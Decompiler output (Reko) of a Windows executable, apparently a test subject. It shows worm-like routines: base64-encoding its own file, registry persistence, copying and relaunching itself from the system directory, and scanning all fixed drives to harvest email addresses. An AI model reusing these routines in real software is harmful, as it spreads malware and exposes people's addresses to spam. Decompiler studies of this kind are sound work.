// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000(Stack (ptr32 Eq_2) dwArg04, Stack uint32 dwArg08)
void fn00401000(Eq_2 * dwArg04, uint32 dwArg08)
{
	union Eq_2 * edi_11 = dwArg04;
	uint32 ecx_14 = dwArg08 >> 0x02;
	if (dwArg08 >> 0x02 != 0x00)
	{
		while (ecx_14 != 0x00)
		{
			*edi_11 = 0x00;
			edi_11 = (union Eq_2 *) ((char *) edi_11 + 0x04);
			ecx_14 = ecx_14 - 0x01;
		}
	}
	ui32 ecx_21 = dwArg08 & 0x03;
	if ((dwArg08 & 0x03) != 0x00)
	{
		while (ecx_21 != 0x00)
		{
			*edi_11 = (union Eq_2 *) 0x00;
			edi_11 = (union Eq_2 *) ((char *) edi_11 + 0x01);
			ecx_21 = ecx_21 - 0x01;
		}
	}
}

// 004010DD: Register ui32 fn004010DD(Register Eq_38 edx, Stack Eq_38 dwArg04, Stack Eq_38 dwArg08, Stack Eq_41 dwArg0C)
ui32 fn004010DD(Eq_38 edx, Eq_38 dwArg04, Eq_38 dwArg08, Eq_41 dwArg0C)
{
	word32 dwLoc08_100 = 0x00;
	Eq_38 esi_145 = dwArg04;
	Eq_38 edi_104 = dwArg08;
	Eq_41 ecx_107 = dwArg0C;
	uint32 eax_103 = 0x00;
	do
	{
		byte al_137;
		uint32 eax_136;
		ui32 ebx_141 = 0x00;
		uint32 eax_47 = DPB(eax_103, *esi_145, 0);
		esi_145 = (word32) esi_145 + 0x01;
		Eq_41 ecx_150 = ecx_107 - 0x01;
		if (ecx_150 == 0x00)
		{
			eax_136 = eax_47 << 0x10;
			al_137 = (byte) (eax_47 << 0x10);
			ebx_141 = 0x02;
		}
		else
		{
			ui32 eax_144 = DPB(eax_47 << 0x08, *esi_145, 0);
			esi_145 = (word32) esi_145 + 0x01;
			eax_136 = eax_144 << 0x08;
			al_137 = (byte) (eax_144 << 0x08);
			ecx_150 = ecx_150 - 0x01;
			if (ecx_150 == 0x01)
				ebx_141 = 0x01;
			else
			{
				al_137 = (byte) *((word32) esi_145 + 0x01);
				eax_136 = DPB(eax_144 << 0x08, al_137, 0);
				esi_145 = (word32) esi_145 + 0x02;
				ecx_150 = ecx_150 - 0x02;
			}
		}
		word32 ecx_66 = 0x04;
		do
		{
			Eq_87 dl_77 = al_137 & 0x3F;
			eax_136 = eax_136 >> 0x06;
			edx = DPB(__rol(edx, 0x08), dl_77, 0);
			al_137 = (byte) eax_136;
			ecx_66 = ecx_66 - 0x01;
		} while (ecx_66 != 0x00);
		Eq_38 edx_86 = fn00401159(0x04, dl_77);
		*edi_104 = edx_86;
		word32 v18_96 = dwLoc08_100 + 0x01;
		edi_104 = (word32) edi_104 + 0x04;
		edx = edx_86;
		dwLoc08_100 = v18_96;
		if (v18_96 == 0x12)
		{
			*edi_104 = 0x0A0D;
			dwLoc08_100 = 0x00;
			edi_104 = (word32) edi_104 + 0x02;
		}
		eax_103 = eax_136;
		ecx_107 = ecx_150;
	} while (ecx_150 != 0x00);
	ui32 ecx_111 = ebx_141;
	byte * edi_112 = edi_104 - ebx_141;
	while (ecx_111 != 0x00)
	{
		*edi_112 = 0x3D;
		edi_112 = edi_112 + 0x01;
		ecx_111 = ecx_111 - 0x01;
	}
	return ecx_111;
}

// 00401159: Register word32 fn00401159(Register word32 ecx, Register Eq_87 dl)
word32 fn00401159(word32 ecx, Eq_87 dl)
{
	do
	{
		Eq_38 edx_14;
		if (dl < 0x3E)
		{
			if (dl <= 0x33)
			{
				Eq_170 dl_22 = (word32) dl + 0x0041;
				edx_14 = DPB(edx, dl_22, 0);
				if (dl_22 > 0x5A)
					edx_14 = DPB(edx, (word32) dl_22 + 0x06, 0);
			}
			else
				edx_14 = DPB(edx, (word32) dl + 252, 0);
		}
		else
			edx_14 = DPB(edx, (dl - 0x3E << 0x02) + 0x2B, 0);
		edx = __rol(edx_14, 0x08);
		dl = (byte) edx;
		ecx = ecx - 0x01;
	} while (ecx != 0x00);
	return edx;
}

// 0040126F: void fn0040126F(Stack Eq_41 dwArg04)
void fn0040126F(Eq_41 dwArg04)
{
	globals->t405814 = dwArg04;
	globals->dw4056C5 = 0x01;
	word32 * edi_17 = &globals->t405814;
	Eq_41 eax_11 = dwArg04;
	do
	{
		edi_17 = edi_17 + 0x01;
		eax_11 = (word32) (globals->dw4056C9 * eax_11);
		*edi_17 = (word32) eax_11;
		globals->dw4056C5 = globals->dw4056C5 + 0x01;
	} while (globals->dw4056C5 != 0x0270);
}

// 004012AA: Register uint32 fn004012AA(Stack ui32 dwArg04, Register out ptr32 ecxOut)
uint32 fn004012AA(ui32 dwArg04, ptr32 & ecxOut)
{
	*ecxOut = ecx;
	if (globals->dw4056C5 >= 0x0270)
	{
		if (globals->dw4056C5 == 0x0271)
			fn0040126F(0x1105);
		word32 dwLoc08_103 = 0x00;
		struct Eq_265 * esi_101 = &globals->t405814;
		do
		{
			uint32 eax_83 = esi_101->dw0000 & 0x80000000 | esi_101[0x01] & 0x7FFFFFFF;
			ui32 eax_160 = eax_83 >> 0x01 ^ esi_101[0x018D];
			if ((eax_83 & 0x01) != 0x00)
				eax_160 = eax_160 ^ 0x9908B0DF;
			esi_101->dw0000 = eax_160;
			word32 v17_102 = dwLoc08_103 + 0x01;
			esi_101 = esi_101 + 0x01;
			dwLoc08_103 = v17_102;
		} while (v17_102 != 227);
		do
		{
			uint32 eax_113 = esi_101->dw0000 & 0x80000000 | esi_101[0x01] & 0x7FFFFFFF;
			ui32 eax_119 = eax_113 >> 0x01 ^ esi_101->dwFFFFFC74;
			if ((eax_113 & 0x01) != 0x00)
				eax_119 = eax_119 ^ 0x9908B0DF;
			esi_101->dw0000 = eax_119;
			word32 v18_132 = dwLoc08_103 + 0x01;
			esi_101 = esi_101 + 0x01;
			dwLoc08_103 = v18_132;
		} while (v18_132 != 0x026F);
		ui32 ecx_141 = eax_113 & 0x01 & 0x01;
		ui32 eax_139 = eax_119 ^ globals->dw405E44;
		word32 ecx_142;
		*ecxOut = ecx_141;
		if (ecx_141 != 0x00)
			eax_139 = eax_139 ^ 0x9908B0DF;
		esi_101->dw0000 = eax_139;
		globals->dw4056C5 = 0x00;
	}
	uint32 eax_32 = globals->dw4056C5;
	globals->dw4056C5 = globals->dw4056C5 + 0x01;
	uint32 eax_37 = (&globals->t405814)[eax_32];
	ui32 ebx_40 = eax_37 ^ eax_37 >> 11;
	ui32 ebx_44 = ebx_40 ^ ebx_40 << 0x07 & 2636928640;
	uint32 ebx_48 = ebx_44 ^ ebx_44 << 0x0F & 0xEFC60000;
	return (uint32) ((uint64) (uint32) (ebx_48 >> 0x12 ^ ebx_48) % dwArg04);
}

// 00401524: void fn00401524(Stack (ptr32 Eq_38) dwArg04, Stack ui32 dwArg08)
void fn00401524(Eq_38 * dwArg04, ui32 dwArg08)
{
	*dwArg04 = (union Eq_38 *) GlobalAlloc(0x40, dwArg08 << 0x02);
}

// 004015A5: void fn004015A5()
void fn004015A5()
{
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, fp - 0x08);
	if (RegQueryValueExA(dwLoc08, 0x00405702, null, fp - 0x0C, globals->a4056CD, fp - 0x10) != 0x00)
	{
		byte * edi_68 = globals->a4056CD;
		word32 esi_69 = 0x09;
		do
		{
			word32 ecx_74;
			*edi_68 = (byte) (fn004012AA(0x09, out ecx_74) + 0x31);
			edi_68 = edi_68 + 0x01;
			esi_69 = esi_69 - 0x01;
		} while (esi_69 != 0x00);
		RegSetValueExA(dwLoc08, 0x00405702, 0x00, 0x01, globals->a4056CD, 0x08);
	}
	RegCloseKey(dwLoc08);
}

// 00401625: Register Eq_384 fn00401625()
LSTATUS fn00401625()
{
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x00405706, fp - 0x08);
	RegSetValueExA(dwLoc08, 0x00405734, 0x00, 0x01, &globals->t407F20, lstrlenA(4226848));
	return RegCloseKey(dwLoc08);
}

// 00401669: Register word32 fn00401669()
word32 fn00401669()
{
	word32 eax_47;
	GetLocalTime(fp - 0x14);
	fn00401000(fp - 0x24, 0x10);
	SystemTimeToFileTime(fp - 0x14, fp - 44);
	SystemTimeToFileTime(fp - 0x24, fp - 0x34);
	if (CompareFileTime(fp - 44, fp - 0x34) == 0x01)
		eax_47 = 0x00;
	else
		eax_47 = 0x01;
	return eax_47;
}

// 004016CA: Register word32 fn004016CA()
word32 fn004016CA()
{
	Eq_38 eax_12 = GlobalAlloc(0x40, 0x2000);
	GetModuleFileNameA(null, eax_12, 0x1FFF);
	Eq_41 eax_39 = CreateFileA(eax_12, 0x80000000, 0x01, null, 0x03, 0x00, 0x00);
	if (eax_39 != 0x01)
	{
		Eq_41 eax_75 = GetFileSize(eax_39, null);
		if (eax_75 != 0x01)
		{
			Eq_41 eax_111 = CreateFileMappingA(eax_39, null, 0x02, 0x00, 0x00, 0x00);
			if (eax_111 != 0x00)
			{
				Eq_38 eax_128 = MapViewOfFile(eax_111, 0x04, 0x00, 0x00, 0x00);
				if (eax_128 != 0x00)
				{
					globals->t407F14 = GlobalAlloc(0x40, eax_75 << 0x02);
					ecx = fn004010DD(eax_128, eax_128, globals->t407F14, eax_75);
					globals->t407F18 = lstrlenA(globals->t407F14);
					UnmapViewOfFile(eax_128);
				}
				CloseHandle(eax_111);
			}
		}
		CloseHandle(eax_39);
	}
	GlobalFree(eax_12);
	return ecx;
}

// 0040179B: void fn0040179B()
void fn0040179B()
{
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, fp - 0x08);
	RegSetValueExA(dwLoc08, 0x0040574F, 0x00, 0x04, fp - 0x0C, 0x04);
	RegCloseKey(dwLoc08);
}

// 004017DC: Register word32 fn004017DC()
word32 fn004017DC()
{
	word32 ebx_43;
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, fp - 0x08);
	if (RegQueryValueExA(dwLoc08, 0x0040574F, null, fp - 0x0C, fp - 0x14, fp - 0x10) != 0x00)
		ebx_43 = 0x01;
	else
		ebx_43 = 0x00;
	RegCloseKey(dwLoc08);
	return ebx_43;
}

// 00401835: Register word32 fn00401835()
word32 fn00401835()
{
	if (fn00401669() != 0x00)
	{
		fn0040126F(GetTickCount());
		fn004015A5();
		WSAStartup(0x0101, fp - 0x0192);
		fn00402ADD();
		globals->t407F1C = CreateMutexA(null, 0x00, 0x00);
		fn00402737();
		word32 ecx_36 = fn004016CA();
		GetSystemDirectoryA(4226848, 0x0104);
		GetModuleFileNameA(null, 0x00408025, 0x0104);
		lstrcatA(4226848, 4216642);
		word32 eax_57 = fn00401625();
		ptr32 esp_62;
		word32 ebp_63;
		byte SCZO_64;
		word32 eax_65;
		byte SZO_66;
		bool C_67;
		bool Z_68;
		word32 ecx_69;
		shlwapi.dll!StrStrIA();
		if (eax_65 != 0x00)
		{
			if (fn004017DC() != 0x00)
				globals->dw405754 = 0x01;
			fn0040179B();
			return ecx_69;
		}
		else
		{
			Eq_38 eax_102 = GetCommandLineA();
			do
			{
				if (*eax_102 == 0x6470752D)
					goto l004018F5;
				eax_102 = eax_102 + 0x01;
			} while (*((word32) eax_102 + 0x03) != 0x00);
			*(esp_62 - 0x04) = 0x05;
			*(esp_62 - 0x08) = 4216545;
			WinExec(*(esp_62 - 0x08), *(esp_62 - 0x04));
l004018F5:
			*(esp_62 - 0x04) = 0x00;
			*(esp_62 - 0x08) = 4226848;
			*(esp_62 - 0x0C) = 0x00408025;
			if (CopyFileA(*(esp_62 - 0x0C), *(esp_62 - 0x08), *(esp_62 - 0x04)) != 0x00)
			{
				*(esp_62 - 0x04) = 0x00;
				*(esp_62 - 0x08) = 4226848;
				WinExec(*(esp_62 - 0x08), *(esp_62 - 0x04));
			}
			*(esp_62 - 0x04) = 0x00;
			ExitProcess(*(esp_62 - 0x04));
		}
	}
	else
		ExitProcess(0x00);
}

// 00401C78: void fn00401C78(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn00401C78(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	Eq_38 eax_12 = GlobalAlloc(0x00, 0x0C);
	*eax_12 = dwArg04;
	*((word32) eax_12 + 0x04) = dwArg08;
	*((word32) eax_12 + 0x08) = dwArg0C;
	CloseHandle(CreateThread(null, 0x00, &globals->t401BA7, eax_12, 0x00, fp - 0x0C));
}

// 00402737: void fn00402737()
void fn00402737()
{
	globals->t408146 = CreateMutexA(null, 0x00, 0x00);
	globals->dw40812A = 0x00;
	globals->dw40812E = 0x00;
	word32 ebx_19 = 0x05;
	word32 * edi_20 = globals->a408132;
	do
	{
		*edi_20 = (word32) GlobalAlloc(0x40, 0x0C);
		edi_20 = edi_20 + 0x01;
		ebx_19 = ebx_19 - 0x01;
	} while (ebx_19 != 0x00);
}

// 004028A5: Register Eq_38 fn004028A5(Register Eq_38 esi, Stack Eq_38 dwArg04)
Eq_38 fn004028A5(Eq_38 esi, Eq_38 dwArg04)
{
	Eq_38 ebx_12 = esi;
	Eq_38 esi_14 = esi - 0x02;
	cu8 cl_16 = 0x01;
	while (esi_14 >= dwArg04)
	{
		cu8 al_49 = *esi_14;
		esi_14 = esi_14 - 0x01;
		if ((al_49 < 0x30 || al_49 > 0x39) && ((al_49 < 0x41 || al_49 > 0x5A) && ((al_49 < 0x61 || al_49 > 122) && (al_49 != 0x2E && (al_49 != 0x5F && (al_49 != 0x2D && (al_49 != 0x00 || cl_16 == 0x00)))))))
			return ebx_12;
		ebx_12 = (word32) esi_14 + 0x01;
		cl_16 = al_49;
	}
	return ebx_12;
}

// 004028F3: Register Eq_38 fn004028F3(Register Eq_38 esi, Stack Eq_38 dwArg04)
Eq_38 fn004028F3(Eq_38 esi, Eq_38 dwArg04)
{
	Eq_38 ebx_12 = esi;
	cu8 cl_14 = 0x01;
	while (esi < dwArg04)
	{
		cu8 al_46 = *esi;
		esi = (word32) esi + 0x01;
		if ((al_46 < 0x30 || al_46 > 0x39) && ((al_46 < 0x41 || al_46 > 0x5A) && ((al_46 < 0x61 || al_46 > 122) && (al_46 != 0x2E && (al_46 != 0x5F && (al_46 != 0x2D && (al_46 != 0x00 || cl_14 == 0x00)))))))
			return ebx_12;
		ebx_12 = esi;
		cl_14 = al_46;
	}
	return ebx_12;
}

// 0040293D: Register word32 fn0040293D(Stack Eq_38 dwArg04, Stack Eq_38 dwArg08)
word32 fn0040293D(Eq_38 dwArg04, Eq_38 dwArg08)
{
	if (dwArg08 - dwArg04 < 0x02)
		return 0x00;
	return 0x01;
}

// 0040295A: void fn0040295A(Register word32 eax, Stack Eq_38 dwArg04)
void fn0040295A(word32 eax, Eq_38 dwArg04)
{
	ptr32 esp_14;
	word32 ebp_15;
	word32 eax_16;
	byte SZO_17;
	bool C_18;
	bool Z_19;
	byte SCZO_20;
	byte CZ_21;
	shlwapi.dll!StrRChrA();
	if (eax_16 != 0x00)
	{
		*(esp_14 - 0x04) = eax_16;
		lstrlenA(*(esp_14 - 0x04)) > 0x02;
	}
}

// 00402985: Register up32 fn00402985(Register ptr32 ebp, Stack Eq_38 dwArg04, Stack Eq_41 dwArg08, Stack Eq_38 dwArg0C)
up32 fn00402985(ptr32 ebp, Eq_38 dwArg04, Eq_41 dwArg08, Eq_38 dwArg0C)
{
	word32 dwLoc10_16 = 0x00;
	Eq_38 esi_112 = dwArg04;
	ptr32 esp_113 = fp + ~0x020F;
	word32 v9_26 = dwArg08 + dwArg04;
	while (esi_112 < v9_26)
	{
		word32 v11_53 = dwLoc10_16 + 0x01;
		dwLoc10_16 = v11_53;
		if (v11_53 == 10000)
		{
			union Eq_41 * esp_200 = esp_113 - 0x04;
			*esp_200 = 0x01;
			Sleep(*esp_200);
			dwLoc10_16 = 0x00;
		}
		esi_112 = (word32) esi_112 + 0x01;
		if (*esi_112 == 0x40)
		{
			word32 * esp_80 = esp_113 - 0x04;
			*esp_80 = (word32) esi_112;
			*(esp_80 - 0x04) = (union Eq_38 *) dwArg04;
			byte * eax_86 = fn004028A5(esi_112, dwArg00);
			*(esp_80 - 0x04) = (union Eq_38 *) v9_26;
			word32 * esp_111 = esp_80;
			ecx = fn004028F3(esi_112, dwArg00) - eax_86;
			if (ecx < 500 && ecx > 0x05)
			{
				byte * esi_117 = eax_86;
				byte * edi_118 = fp - 0x0204;
				byte * edx_119 = null;
				do
				{
					byte al_128 = *esi_117;
					esi_117 = esi_117 + 0x01;
					if (al_128 != 0x00)
					{
						*edi_118 = al_128;
						edi_118 = edi_118 + 0x01;
						if (al_128 == 0x40)
							edx_119 = edi_118;
					}
					ecx = ecx - 0x01;
				} while (ecx != 0x00);
				*edi_118 = 0x00;
				ptr32 edi_142 = edi_118 + 0x01;
				if (edx_119 != null)
				{
					*(esp_80 - 0x04) = (byte **) edx_119;
					*(esp_80 - 0x08) = fp - 0x0204;
					Eq_41 eax_152 = lstrlenA(*(esp_80 - 0x08));
					word32 edx_154 = *(esp_80 - 0x04);
					esp_111 = esp_80;
					if (eax_152 > 0x05)
					{
						*(esp_80 - 0x04) = edx_154;
						*(esp_80 - 0x08) = fp - 0x0204;
						word32 eax_163 = fn0040293D(dwArg00, dwArg04);
						*(esp_80 - 0x04) = edi_142;
						*(esp_80 - 0x08) = edx_154;
						fn0040295A(eax_163, dwArg00);
						esp_111 = esp_80;
						if (eax_163 != 0x00)
						{
							*(esp_80 - 0x04) = fp - 0x0204;
							word32 ebp_181;
							byte SCZO_182;
							word32 esi_183;
							word32 edi_184;
							word32 ebx_185;
							bool C_186;
							byte SZO_187;
							bool Z_188;
							bool D_189;
							byte al_190;
							word32 eax_191;
							byte CZ_193;
							word32 edx_194;
							dwArg0C();
						}
					}
				}
			}
			esi_112 = *esp_111;
			esp_113 = esp_111 + 0x01;
		}
	}
	return ecx;
}

// 00402A5A: Register word32 fn00402A5A(Stack Eq_38 dwArg04, Stack Eq_38 dwArg08, Register out ptr32 esiOut)
word32 fn00402A5A(Eq_38 dwArg04, Eq_38 dwArg08, ptr32 & esiOut)
{
	*esiOut = esi;
	Eq_41 eax_27 = CreateFileA(dwArg04, 0x80000000, 0x01, null, 0x03, 0x00, 0x00);
	if (eax_27 != 0x01)
	{
		Eq_41 eax_59 = GetFileSize(eax_27, null);
		if (eax_59 != 0x01)
		{
			Eq_41 eax_93 = CreateFileMappingA(eax_27, null, 0x02, 0x00, 0x00, 0x00);
			if (eax_93 != 0x00)
			{
				Eq_38 eax_110 = MapViewOfFile(eax_93, 0x04, 0x00, 0x00, 0x00);
				if (eax_110 != 0x00)
				{
					ecx = fn00402985(fp - 0x04, eax_110, eax_59, dwArg08);
					UnmapViewOfFile(eax_110);
				}
				CloseHandle(eax_93);
			}
		}
		CloseHandle(eax_27);
	}
	return ecx;
}

// 00402ADD: void fn00402ADD()
void fn00402ADD()
{
	fn00401524(&globals->t40814A, 5000);
	globals->b40814E = 0x00;
}

// 00402B8F: Register ui32 fn00402B8F(Register ui32 ecx, Register ptr32 ebp, Stack Eq_38 dwArg04, Register out ptr32 esiOut, Register out Eq_1301 ediOut)
ui32 fn00402B8F(ui32 ecx, ptr32 ebp, Eq_38 dwArg04, ptr32 & esiOut, Eq_1301 & ediOut)
{
	word32 * esp_20 = fp - 0x08;
	byte * edi_18 = &globals->b40501C;
	do
	{
		ui32 ecx_25 = ecx | ~0x00;
		edi_31 = edi_18;
		do
		{
			byte * edi_31;
			if (ecx_88 == 0x00)
				break;
			edi_31 = edi_89 + 0x01;
			ecx_25 = ecx_88 - 0x01;
			ui32 ecx_88 = ecx_25;
			byte * edi_89 = edi_31;
		} while (0x00 == *edi_89);
		byte ** esp_32 = esp_20 - 0x04;
		*esp_32 = (byte **) edi_18;
		*(esp_32 - 0x04) = (union Eq_38 *) dwArg04;
		word32 ebp_39;
		bool D_41;
		word32 edx_42;
		word32 eax_43;
		byte SZO_44;
		bool C_45;
		byte SCZO_47;
		byte al_48;
		bool Z_49;
		word32 esi_50;
		shlwapi.dll!StrStrIA();
		if (eax_43 != 0x00)
		{
			*(esp_20 - 0x04) = 0x00402B2C;
			*(esp_20 - 0x08) = (union Eq_38 *) dwArg04;
			word32 esi_70;
			ui32 ecx_71 = fn00402A5A(dwArg00, dwArg04, out esi_70);
			word32 edi_73;
			*ediOut = *esp_20;
			return ecx_71;
		}
	} while (*edi_18 != 0x00);
	word32 edi_79;
	*ediOut = *esp_20;
	return ecx;
}

// 00402BCB: Register ui32 fn00402BCB(Register ui32 ecx, Register ptr32 ebp, Stack Eq_38 dwArg04, Stack Eq_38 dwArg08, Register out ptr32 esiOut)
ui32 fn00402BCB(ui32 ecx, ptr32 ebp, Eq_38 dwArg04, Eq_38 dwArg08, ptr32 & esiOut)
{
	*esiOut = esi;
	Eq_41 eax_15 = LocalAlloc(0x00, 0x0400);
	Eq_41 eax_22 = LocalAlloc(0x00, 0x013E);
	Eq_41 edi_150 = lstrlenA(dwArg04);
	lstrcatA(dwArg04, 0x004057E7);
	Eq_41 eax_45 = FindFirstFileA(dwArg04, eax_22);
	ptr32 esp_106 = fp + ~0x13;
	if (eax_45 != 0x01)
	{
		do
		{
			Mem85[edi_150 + dwArg04:byte] = 0x00;
			if (*((word32) eax_22 + 44) != 0x2E && *((word32) eax_22 + (void *) 44) != 0x2E2E)
			{
				union Eq_38 * esp_117 = esp_106 - 0x04;
				*esp_117 = (word32) eax_22 + (void *) 44;
				*(esp_117 - 0x04) = (union Eq_38 *) dwArg04;
				lstrcatA(*(esp_117 - 0x04), *esp_117);
				if ((*eax_22 & 0x10) != 0x00)
				{
					*esp_117 = (union Eq_38 *) 0x004057E5;
					*(esp_117 - 0x04) = (union Eq_38 *) dwArg04;
					lstrcatA(*(esp_117 - 0x04), *esp_117);
					*esp_117 = (union Eq_38 *) dwArg08;
					*(esp_117 - 0x04) = (union Eq_38 *) dwArg04;
					esp_106 = esp_117 - 0x04;
					word32 esi_144;
					ecx = fn00402BCB(ecx, fp - 0x04, dwArg00, dwArg04, out esi_144);
				}
				else
				{
					*esp_117 = (union Eq_38 *) dwArg04;
					word32 esi_149;
					ecx = fn00402B8F(ecx, fp - 0x04, dwArg00, out esi_149, out edi_150);
					esp_106 = (char *) esp_117 + 0x04;
				}
			}
			union Eq_41 * esp_96 = esp_106 - 0x04;
			*esp_96 = 0x01;
			Sleep(*esp_96);
			*esp_96 = (union Eq_41 *) eax_22;
			*(esp_96 - 0x04) = (union Eq_41 *) eax_45;
			esp_106 = (char *) esp_96 + 0x04;
		} while (FindNextFileA(*(esp_96 - 0x04), *esp_96) != 0x00);
		*esp_96 = (union Eq_41 *) eax_45;
		FindClose(*esp_96);
		esp_106 = (char *) esp_96 + 0x04;
	}
	union Eq_41 * esp_64 = esp_106 - 0x04;
	*esp_64 = (union Eq_41 *) eax_15;
	LocalFree(*esp_64);
	*esp_64 = (union Eq_41 *) eax_22;
	LocalFree(*esp_64);
	return ecx;
}

// 00402C9D: Register ui32 fn00402C9D(Register ui32 ecx, Stack Eq_38 dwArg04, Register out Eq_1579 esiOut)
ui32 fn00402C9D(ui32 ecx, Eq_38 dwArg04, Eq_1579 & esiOut)
{
	Eq_38 eax_12 = GlobalAlloc(0x40, 0x00010000);
	Eq_38 eax_21 = lstrcpyA(eax_12, dwArg04);
	word32 esi_28;
	ui32 ecx_29 = fn00402BCB(ecx, fp - 0x04, eax_21, eax_21, out esi_28);
	GlobalFree(eax_12);
	return ecx_29;
}

// 00402CCE: void fn00402CCE(Register ui32 ecx)
void fn00402CCE(ui32 ecx)
{
	Eq_38 eax_18 = GlobalAlloc(0x40, 0x2000);
	GetLogicalDriveStringsA(0x1FFF, eax_18);
	Eq_38 esi_28 = eax_18;
	while (*esi_28 != 0x00)
	{
		if (GetDriveTypeA(esi_28) == 0x03)
			ecx = fn00402C9D(ecx, esi_28, out esi_28);
		esi_28 = esi_28 + lstrlenA(esi_28) + 0x01;
	}
	GlobalFree(eax_18);
}

// 00402E07: void fn00402E07()
void fn00402E07()
{
	CloseHandle(CreateThread(null, 0x00, &globals->t402DED, 0x00, 0x00, fp - 0x08));
}

// 0040318A: Register Eq_41 Win32CrtStartup()
Eq_41 Win32CrtStartup()
{
	CoInitialize(0x00);
	ui32 ecx_10 = fn00401835();
	if (globals->dw405003 == 0x00)
		globals->dw405003 = fn004012AA(45000, out ecx_10) + 5000;
	fn00401C78(globals->dw405003, 0x004030F6, 4216668);
	fn00402E07();
	if (globals->dw405754 != 0x00)
		fn00402CCE(ecx_10);
	while (true)
		Sleep(1000);
}

